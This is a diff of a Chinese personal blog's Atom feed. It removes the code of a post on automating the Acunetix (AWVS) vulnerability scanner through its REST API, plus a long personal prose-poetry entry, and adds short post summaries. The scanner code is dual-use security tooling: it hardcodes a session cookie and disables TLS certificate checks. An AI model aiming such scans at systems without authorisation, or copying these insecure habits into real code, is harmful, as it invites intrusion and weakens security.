11111111-1111-1111-1111-111111111111    Developer</div><div class="line">    21111111-1111-1111-1111-111111111111    XML</div><div class="line">    11111111-1111-1111-1111-111111111119    OWASP Top 10 2013</div><div class="line">    11111111-1111-1111-1111-111111111112    Quick</div><div class="line">    &apos;&apos;&apos;</div><div class="line">    data = &#123;&quot;template_id&quot;: &quot;11111111-1111-1111-1111-111111111111&quot;,</div><div class="line">            &quot;source&quot;: &#123;&quot;list_type&quot;: &quot;scans&quot;, &quot;id_list&quot;: [scan_id]&#125;&#125;</div><div class="line">    try:</div><div class="line">        response = requests.post(tarurl + &quot;/api/v1/reports&quot;, data=json.dumps(data), headers=headers, timeout=30,</div><div class="line">                                 verify=False)</div><div class="line">        result = response.headers</div><div class="line">        report = result[&apos;Location&apos;].replace(&apos;/api/v1/reports/&apos;, &apos;/reports/download/&apos;)</div><div class="line">        return tarurl.rstrip(&apos;/&apos;) + report</div><div class="line">    except Exception as e:</div><div class="line">        print(str(e))</div><div class="line">        return</div><div class="line">    finally:</div><div class="line">        delete_scan(scan_id)</div><div class="line"></div><div class="line"></div><div class="line">def config(url):</div><div class="line">    target_id = addtask(url)</div><div class="line">    # 获取全部的扫描状态</div><div class="line">    data = &#123;</div><div class="line">        &quot;excluded_paths&quot;: [&quot;manager&quot;, &quot;phpmyadmin&quot;, &quot;testphp&quot;],</div><div class="line">        &quot;user_agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36&quot;,</div><div class="line">        &quot;custom_headers&quot;: [&quot;Accept: */*&quot;, &quot;Referer:&quot; + url, &quot;Connection: Keep-alive&quot;],</div><div class="line">        &quot;custom_cookies&quot;: [&#123;&quot;url&quot;: url,</div><div class="line">                            &quot;cookie&quot;: &quot;UM_distinctid=15da1bb9287f05-022f43184eb5d5-30667808-fa000-15da1bb9288ba9; PHPSESSID=dj9vq5fso96hpbgkdd7ok9gc83&quot;&#125;],</div><div class="line">        &quot;scan_speed&quot;: &quot;moderate&quot;,  # sequential/slow/moderate/fast more and more fast</div><div class="line">        &quot;technologies&quot;: [&quot;PHP&quot;],  # ASP,ASP.NET,PHP,Perl,Java/J2EE,ColdFusion/Jrun,Python,Rails,FrontPage,Node.js</div><div class="line">        # 代理</div><div class="line">        &quot;proxy&quot;: &#123;</div><div class="line">            &quot;enabled&quot;: False,</div><div class="line">            &quot;address&quot;: &quot;127.0.0.1&quot;,</div><div class="line">            &quot;protocol&quot;: &quot;http&quot;,</div><div class="line">            &quot;port&quot;: 8080,</div><div class="line">            &quot;username&quot;: &quot;aaa&quot;,</div><div class="line">            &quot;password&quot;: &quot;bbb&quot;</div><div class="line">        &#125;,</div><div class="line">        # 无验证码登录</div><div class="line">        &quot;login&quot;: &#123;</div><div class="line">            &quot;kind&quot;: &quot;automatic&quot;,</div><div class="line">            &quot;credentials&quot;: &#123;</div><div class="line">                &quot;enabled&quot;: False,</div><div class="line">                &quot;username&quot;: &quot;test&quot;,</div><div class="line">                &quot;password&quot;: &quot;test&quot;</div><div class="line">            &#125;</div><div class="line">        &#125;,</div><div class="line">        # 401认证</div><div class="line">        &quot;authentication&quot;: &#123;</div><div class="line">            &quot;enabled&quot;: False,</div><div class="line">            &quot;username&quot;: &quot;test&quot;,</div><div class="line">            &quot;password&quot;: &quot;test&quot;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    try:</div><div class="line">        res = requests.patch(tarurl + &quot;/api/v1/targets/&quot; + str(target_id) + &quot;/configuration&quot;, data=json.dumps(data),</div><div class="line">                             headers=headers, timeout=30 * 4, verify=False)</div><div class="line"></div><div class="line">        data = &#123;&quot;target_id&quot;: target_id, &quot;profile_id&quot;: &quot;11111111-1111-1111-1111-111111111111&quot;,</div><div class="line">                &quot;schedule&quot;: &#123;&quot;disable&quot;: False, &quot;start_date&quot;: None, &quot;time_sensitive&quot;: False&#125;&#125;</div><div class="line">        try:</div><div class="line">            response = requests.post(tarurl + &quot;/api/v1/scans&quot;, data=json.dumps(data), headers=headers, timeout=30,</div><div class="line">                                     verify=False)</div><div class="line">            result = json.loads(response.content)</div><div class="line">            return result[&apos;target_id&apos;]</div><div class="line">        except Exception as e:</div><div class="line">            print(str(e))</div><div class="line">            return</div><div class="line">    except Exception as e:</div><div class="line">        raise e</div><div class="line"></div><div class="line">def getvulnerabilities():</div><div class="line">    # 停止scan_id的扫描</div><div class="line">    try:</div><div class="line">        response = requests.get(tarurl + &quot;/api/v1/vulnerabilities&quot;, headers=headers, timeout=30, verify=False)</div><div class="line">        result = json.loads(response.content)</div><div class="line">        print result</div><div class="line">        return result</div><div class="line">    except Exception as e:</div><div class="line">        print(str(e))</div><div class="line">        return</div><div class="line">def getscan():</div><div class="line">    # 获取全部的扫描状态</div><div class="line">    targets = []</div><div class="line">    try:</div><div class="line">        response = requests.get(tarurl + &quot;/api/v1/scans&quot;, headers=headers, timeout=30, verify=False)</div><div class="line">        results = json.loads(response.content)</div><div class="line">        return results</div><div class="line">    except Exception as e:</div><div class="line">        raise e</div><div class="line">def getvulnerabilitiesinfo(sid):</div><div class="line">    # 停止scan_id的扫描</div><div class="line">    try:</div><div class="line">        response = requests.get(tarurl + &quot;/api/v1/vulnerabilities/&quot;+sid, headers=headers, timeout=30, verify=False)</div><div class="line">        result = json.loads(response.content)</div><div class="line">        print result</div><div class="line">        return result</div><div class="line">    except Exception as e:</div><div class="line">        print(str(e))</div><div class="line">        return</div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    info=getscan()</div><div class="line">    print info</div><div class="line">    print type(info)</div><div class="line"></div><div class="line">    #print getreports(&apos;f22d4aa1-e2de-4307-bd9d-ddf3aa531bc1&apos;,locals())</div><div class="line">   # print config(&apos;http://testhtml5.vulnweb.com/&apos;)</div></pre></td></tr></table></figure>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;img src=&quot;http://upload-images.jianshu.io/upload_images/3941016-beb5143ed978f26e.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;nessus.jpg&quot;&gt;&lt;/p&gt;
-&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt; 最近在做自动化安全扫描器开发，在项目中想引用比较知名的扫描器，如是整理了一下API作为参考&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="漏扫" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%89%AB/"/>
-    
-    
-      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
-    
-      <category term="扫描器" scheme="http://yoursite.com/tags/%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
-    
-      <category term="自动化" scheme="http://yoursite.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
-    
-  </entry>
-  
-  <entry>
     <title>小心情</title>
     <link href="http://yoursite.com/2018/05/30/xiaoqiu/"/>
     <id>http://yoursite.com/2018/05/30/xiaoqiu/</id>
     <published>2018-05-30T07:50:31.000Z</published>
     <updated>2018-05-30T07:50:31.000Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote>
-<p>与你分享，最自我的存在，最重要的秘密。<br><img src="http://upload-images.jianshu.io/upload_images/3941016-fe10f7fc79dd1705.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="小秋"></p>
-</blockquote>
-<p>脑海里存在过好多个故事<br>大多包含了我爱你的主题</p>
-<p>它们可能在我想你的某些须臾发生了</p>
-<p>然后消失在我无法说忘记的深深自责里</p>
-<p>偶尔会记录下的都是可以用言语概论的</p>
-<p>在我觉得实在是孤单了喔</p>
-<p>说与 除了你我的爱人们听</p>
-<a id="more"></a>
-<p><img src="http://upload-images.jianshu.io/upload_images/3941016-dbca79068aeaa29b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<p>我还是喜欢和你面对面交谈</p>
-<p>坐在相同的时间和空间里</p>
-<p>对你感到无语的时候就真的不发一言</p>
-<p>你对我心存怀疑的时候可以看着我的眼睛</p>
-<p>他会告诉你我是个好人以及不愿说出口的我爱你</p>
-<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=68450&auto=1&height=66"></iframe>
-
-
-<p>喜欢陌生的街区 无知的人行道</p>
-<p>风带过来的都是那些无知人的气味儿</p>
-<p>你敢信么 走在拥挤的人潮中我反而安心</p>
-<p>那些结伴的骑行者他们的欢颜</p>
-<p>风尘仆仆的赶路人</p>
-<p>推着婴儿车的年轻母亲</p>
-<p>我似乎见过无数次这样的面孔</p>
-<p>他们好像发生着同样的故事</p>
-<p>然而生活本就是如此 千篇一律</p>
-<p>那些个学画的日子里</p>
-<p>兴奋失落骄傲迷茫哭泣</p>
-<p>有你 有她们有青春</p>
-<p>想来都是无比珍贵</p>
-<p>细数不尽的</p>
-<p>这个世界上 我最畏惧的就是时间了</p>
-<p>那个傻瓜阿</p>
-<p>“明年我要带着一大束玫瑰花去军队”</p>
-<p>她喊我的名字 说“我决定了”</p>
-<p>我们经常郑重其事地做一些决定</p>
-<p>然而我还是被点燃了</p>
-<p>我幻想幸福的场景美好的结局</p>
-<p>我哭着拥抱她说“为你高兴”</p>
-<p>她轻拍着我的后背</p>
-<p>在我耳边说“你也会等到这一天的。”</p>
-<p>还带着把握住了幸福的女孩应该有的沉稳语调</p>
-<p>早上自然醒</p>
-<p>想到运动会那天</p>
-<p>你把食指贴近嘴唇作出嘘的动作</p>
-<p>脸上还挂着谈话时的笑意</p>
-<p>样子特别好看</p>
-<p>然后就看到你们的实习老师走了过来</p>
-<p>跳远结束的时候</p>
-<p>你屁颠屁颠跑回来</p>
-<p>一脸兴奋说着刚如何摔惨了丢人了</p>
-<p>样子特别可爱</p>
-<p>可不可以借我一个“从此” 我的故事该完结了</p>
-<p>但是 安徒生先生已经把最后一个“从此”也用掉了</p>
-<p>要不你试试看我的“后来”“以后”“最后”或者“然后”</p>
-<p>不了， 看来我只能让我的王子和公主死掉了</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/3941016-bf7aa59fc2d09c00.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<p>我有时会对自己说，写个故事吧。<br>生活这么无趣，随便写个开头结尾，就能打动人。<br>后来往往无果，因为生活面孔多，生活其实比故事厉害，<br>觉得生活无聊就写不出好看的故事。<br>人为什么会觉得无聊，人们总说，今天简直无聊得要死，<br>这句话其实一点也不夸张啊。<br>有人会选择死亡，要么因为懦弱，他们是被困难打败了；<br>要么就是无聊教唆的，他们无所恋了。<br>我显然还是有所恋的， 就算单恋一个人<br>我也持续了够久。<br>我还是乐意去编织一些乱七八糟的东西，<br>或记录某些真实 给以后。<br>感到无聊的时候，就会把时间奉给想念。<br>离世的长辈，许久未见的朋友，不知去向的故人，<br>不曾相恋的恋人。<br>运气不错的话，过程中就能收获灵感。<br>潜意识里那些想说的话，会在一瞬间，自己就排列组合<br>小跑而来。</p>
-<p>那女人按照惯例，<br>在星期一的早晨，<br>又开始数落起她可怜的丈夫。<br>“我真是受够了，<br>看看你没出息的样子。”<br>她先是重复了上周<br>以及上上周<br>以及上上上周的开场白。<br>他的丈夫沉默不语，<br>或许没听到，因为他正</p>
-<p>“记得把牛奶喝掉，<br>喝完记得把杯子洗干净。<br>我去上班了，<br>这日子简直没法过了。”<br>结束语也一样。</p>
-<p>能随着性子，<br>最终完成一件事。<br>便十分美好。</p>
-<p>朝闻道，夕死可矣。<br>人们想要强调某件事时，<br>总会把话说得极其夸张。</p>
-<p>相对老无所依这样故弄玄虚的电影，<br>还是更喜欢听别人实实在在讲故事。<br>比如一次别离，比如通天塔。<br>它们首先是想好好讲一个好故事，<br>而后希望发人深省产生讨论。<br>它们讲礼貌，是特别有诚意的诉说者。</p>
-<p>我们是动物<br>孤独地过冬<br>春天来了<br>我把自己滚成一个球<br>沿路摘几颗新鲜的酱果<br>赶到你家门口<br>等待你慢慢苏醒的样子<br>你扑腾了几下<br>张开了翅膀<br>看到坐在树下的我<br>你高兴地俯冲下来<br>叼走了我背上的紫色酱果<br>然后飞走了<br>我拾起你掉落的羽毛<br>如获珍宝</p>
-<p>回忆往常日子里<br>所有与你的对视</p>
-<p>夏尔走了之后<br>每个星期都会去镇上喝酒<br>最近去得比较频繁<br>我爱上了一个姑娘<br>每天下午三点<br>她会推着小推车来给酒馆送酒<br>一个月过去夏尔还没有回来<br>我带姑娘回家<br>她自己脱衣服然后洗澡<br>在做第三次的时候她说<br>我知道你不爱我<br>你只不过想讲一个故事</p>
-<p>你连一把好剑都没有<br>你也好意思说自己是行侠仗义的江湖中人<br>那个兜里不过揣了几把小刀的卷卷头竟也嘲笑我<br>当时我也是年轻气盛冲上去几拳把他打倒在地<br>眼看他一脸血我接着用力补了几脚就扬长而去<br>隐约听到围观的人群中传来声音小李小李你没事吧<br>我顾自向前</p>
-<p>她突然说“我妈妈是在酉时生下我的，<br>日落酉时，记住啦，我死了你要告诉道士先生呀”<br>“日落有时？就像现在太阳要下山了吗？”<br>“恩，就是傍晚了，好好记住，他们都不知道，<br>我们家总要有一个人知道。”<br>我突然明白这件事是非常神圣的，<br>那年我六七岁，她只告诉我一个人。<br>就在几年前她离开。<br>非常突然，我们每个人都开始自责。<br>她离开之前，家里还在商量她的99岁大寿。<br>出殡那天，我和姑姑还有另外几个人坐一辆车，<br>有个女人一直大声说笑，吵吵闹闹。<br>我想抽她一耳光。<br>我看着窗外，姑姑搂着我。<br>一直下着小雨。</p>
-<p>小时候第一次在户口簿上看到她的名字<br>我嘲笑她说谁给你取的名字啊张大姐</p>
-<p>也是第一次知道她不姓杨而是姓张</p>
-<p>通常我们坐在一起的时候<br>我不大记得是谁先开口<br>说第一句话</p>
-<p>坐在那里抽烟的男人<br>外套歪躺在沙发上<br>墙脚立着一盆绿植，叶子大而茂盛<br>女人不知去了哪里，菜摆在桌上慢慢凉<br>从窗外飞来一只鸟，横冲直撞<br>男人熄灭了半支的烟，躺在沙发上<br>外套压在身下，露出半只袖<br>鸟儿飞来飞去不觉得累<br>汤面上结起一层油花，女人没有回来<br>而墙角立着一盆绿植<br>鸟儿横冲直撞</p>
-<p>和薇聊了好多，<br>五年内几乎没有联系，<br>我给她讲现在的自己，<br>猛然发现曾经最爱做的事情现在依然，<br>写字画画喜欢kimi。<br>你变了么</p>
-<p>2013.12.16 杭州下雪了<br>和你生活在同一座城市的好处是 感受 同样的天气<br>两点钟的时候 各自发条状态迎接季节赠予的礼物 是的下雪了<br>过去几天的雾霾 似乎对我没什么影响好像事不关己<br>早上下雨 冷 撑一把大大的 枣红色的伞<br>下午坐在寝室看非诚勿扰 窗外 雪很大<br>超美的<br><img src="http://upload-images.jianshu.io/upload_images/3941016-a44b39bbba6cb45a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<p>为什么在做事情之前，<br>我不告诉自己，<br>一定要做到最好，<br>要尽到最大的努力去完成。<br>以前总爱顺其自然。<br>我对自己一直很客气，<br>所以我变成特别容易满足的人，<br>对别人也完全没有杀伤力。<br>可能快乐至上吧。<br>失之坦然，得之淡然，处之泰然，顺其自然。<br>并不去给一个对错的判断，快乐就好。<br>最终信仰是：永远忠于自己。</p>
-<p>以前有愿望写故事，<br>以为能像我做其他事情一样顺其自然，<br>没有提纲就这么一味地写，<br>隔半年想再接下去，<br>却发现不能像当初一样随心所欲了。<br>当有无数种可能摆在你面前的时候，<br>你都不知道该如何走向当初设定好的结局。</p>
-<p>我喜欢在家里转圈圈，这样可以带动思考。<br>额(⊙o⊙)…，好吧，我承认我给我的怪癖找了一个冠冕堂皇的借口。</p>
-<p>小时候有暴力倾向。<br>有时认为自己是个自闭症患者。</p>
-<p>大概十一岁的时候我开始懂得构建自己的精神世界，<br>后来开始患得患失，慢慢的，会把自己的情绪放大化，<br>喜欢的人和事物会尤其喜欢，而且持久。</p>
-<p>一生中我们会遇到形形色色的人，<br>入耳许许多多的事，<br>无论你是否主动搭讪这个世界，<br>世界总能带给我们改变。<br>2013年夏天，我在南京。<br>这段旅程蓄谋已久。<br>其然实践起来也并不难，我们甚至连车票都没有提前买好，背着包约定在车站见面。<br>行李简单，拖着一双洞洞鞋，见面是一个不陌生的拥抱。<br>她说的第一句话是，好想你啊。我说的是，好热啊。<br>开玩笑的，你知道我是如此爱你。<br>我相信那些独自旅行的人都是因为找不到合适的伴侣。<br>那个白天我们在图书馆待到闭馆，然后坐着旧巴士穿越了长兴这座小城，从北到南。<br>深夜吃了干挑面，坐在马路边。差不多是凌晨四点的时候，我们坐上了开往南京的火车。<br>从一开始，这段旅程的定义就是要不断给自己找麻烦。<br>八月份，南京，取消青旅预订床位，火车···<br>晚上我们坐在秦淮河旁，有人彻夜聊天，有陌生人和我们坐一桌，扰得我不安稳。<br>有点小雨，我睡着了，她给我支起雨伞，我醒来觉得好笑。<br>且说到这吧。倘若两个人有共同的记忆，一提便会想起来。</p>
-<p>昨天的小清新和之前没写完的故事，就先不分享了。</p>
-<p>该快乐快乐，该烦躁烦躁，建议你快乐</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/3941016-b2b720b0c28be7ee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-]]></content>
     
     <summary type="html">
     
@@ -799,6 +299,58 @@
       <category term="心情" scheme="http://yoursite.com/tags/%E5%BF%83%E6%83%85/"/>
     
       <category term="随笔" scheme="http://yoursite.com/tags/%E9%9A%8F%E7%AC%94/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>nessus与awvs API</title>
+    <link href="http://yoursite.com/2018/05/30/scan/"/>
+    <id>http://yoursite.com/2018/05/30/scan/</id>
+    <published>2018-05-30T07:50:31.000Z</published>
+    <updated>2018-05-30T07:50:31.000Z</updated>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;http://upload-images.jianshu.io/upload_images/3941016-beb5143ed978f26e.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;nessus.jpg&quot;&gt;&lt;/p&gt;
+&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt; 最近在做自动化安全扫描器开发，在项目中想引用比较知名的扫描器，如是整理了一下API作为参考&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="漏扫" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%89%AB/"/>
+    
+    
+      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
+    
+      <category term="扫描器" scheme="http://yoursite.com/tags/%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
+    
+      <category term="自动化" scheme="http://yoursite.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>python中的任务队列</title>
+    <link href="http://yoursite.com/2018/05/30/python-task-ququ22e/"/>
+    <id>http://yoursite.com/2018/05/30/python-task-ququ22e/</id>
+    <published>2018-05-30T07:50:31.000Z</published>
+    <updated>2018-05-30T07:50:31.000Z</updated>
+    
+    <summary type="html">
+    
+      &lt;ul&gt;
+&lt;li&gt;为什么要做任务队列&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;要回答这个问题我们首先看看在流水线上的案列，如果人的速度很慢，机器的速度比人的速度快很多，就会造成，机器生产的东西没有及时处理，越积越多，造成阻塞，影响生产。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="django任务队列" scheme="http://yoursite.com/categories/django%E4%BB%BB%E5%8A%A1%E9%98%9F%E5%88%97/"/>
+    
+    
+      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
+    
+      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
+    
+      <category term="django" scheme="http://yoursite.com/tags/django/"/>
     
   </entry>
   
